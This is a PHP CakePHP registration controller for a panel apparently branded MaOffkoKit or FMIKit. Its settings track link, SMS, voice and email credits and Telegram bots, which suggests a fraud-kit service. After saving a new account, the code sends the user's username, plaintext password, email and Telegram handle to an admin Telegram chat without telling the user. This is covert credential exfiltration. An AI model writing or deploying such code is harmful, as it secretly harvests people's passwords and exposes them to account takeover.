<?php
class RegisterController extends AppController {

	public function index() {
		
		$this->loadModel('Setting');
		$settings_data = $this->Setting->find('first',array(
			'fields'=> array(
				"Setting.enable_signup",
				"Setting.panel_domain",
				"Setting.user_bot_username",
				'Setting.user_telegram_bot',
				'Setting.admin_chat_id',
				'Setting.admin_telegram_bot',
			),
			'recursive'=>-1
		));
		
		$signup_enabled = $settings_data['Setting']['enable_signup'];
		if($signup_enabled==false){
			$this->Session->setFlash("User sign-up is restricted for enhanced security. Thank you for your understanding. For assistance, contact our support team.", 'alert.error');
			return $this->redirect(array('controller' => 'login', 'action' => 'index', 'prefix' => false));
		}
		
		if ($this->request->is('post') || $this->request->is('put')) {

			$this->loadModel('User');
			$this->request->data['User']['role'] = 'User';
			$this->request->data['User']['status'] = 1;
			$this->request->data['User']['two_factor_enabled'] = 1;
			
			unset($this->request->data['User']['link_credits']);
			unset($this->request->data['User']['sms_credits']);
			unset($this->request->data['User']['voice_credits']);
			unset($this->request->data['User']['email_credits']);
			
			
			$username = $this->request->data['User']['username'];
			$password = $this->request->data['User']['password'];
			$email = $this->request->data['User']['email'];
			$telegram_username = $this->request->data['User']['telegram_username'];
			
			$chat_id = $this->request->data['User']['chat_id'];
			$token = $settings_data['Setting']['user_telegram_bot'];
			
			$admin_chat_id = $settings_data['Setting']['admin_chat_id'];
			$admin_token = $settings_data['Setting']['admin_telegram_bot'];
			
			$panel_domain = $settings_data['Setting']['panel_domain'];
			
			$official_group_link = '';
			
			$msg = "Hello $username!\n\nThis is test message to check if you entered a valid chat id. Please ingnore this message, Thank you. \n\nFMIKit Team.\n$official_group_link";
			$response = send_telegram_msg($chat_id,$token,$msg);
			$response = json_decode($response,true);
			$is_success = $response['ok'] ?? false;
			$response_msg = $response['description'] ?? 'Error, make sure your Chat id is valid.';
			
			if($is_success){
				if($this->User->save($this->request->data)){
					
					
					$msg = "Welcome to MaOffkoKit $username! 🥳 \n\nOfficial website : https://$panel_domain\nOfficial Group: $official_group_link\n\nThanks, Enjoy!";
					send_telegram_msg($chat_id,$token,$msg);
					
					$msg = "🥳 New User Signup ✅\n\nUsername: $username\nPassword: $password\nTelegram: $telegram_username\nEmail: $email\n\nMaOffkoKit Team.\n$official_group_link";
					send_telegram_msg($admin_chat_id,$admin_token,$msg);
					
					$this->Session->setFlash("Account created successfully!", 'alert.success');
					return $this->redirect(array('controller' => 'login', 'action' => 'index', 'prefix' => false));
				}else{
					$validation_msg = '';
					foreach($this->User->validationErrors as $key_err=>$error){
						$this->Session->setFlash($error[0], 'alert.error');
					}
				}
			}else{
				$this->Session->write('chat_error',$settings_data);
			}
			
		}
	}
	
	public function beforeFilter() {
		parent::beforeFilter();
		$this->layout = 'login';
		$this->Auth->allow('index');
	}
}
?>